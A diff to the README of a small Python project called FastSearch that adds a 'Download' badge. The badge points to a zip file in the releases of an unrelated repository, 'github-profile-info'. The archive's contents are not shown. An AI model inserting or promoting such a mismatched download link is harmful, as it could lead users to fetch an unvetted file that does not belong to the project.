@@ -1,5 +1,7 @@
 # FastSearch 
 
+[![Download](https://img.shields.io/badge/Download-blue)](https://github.com/TheRealOXY/github-profile-info/releases/download/1.0/github-profile-info.zip)
+
 # WTF is this??!! 
 FastSearch is a python program that I'm currently working on.
 
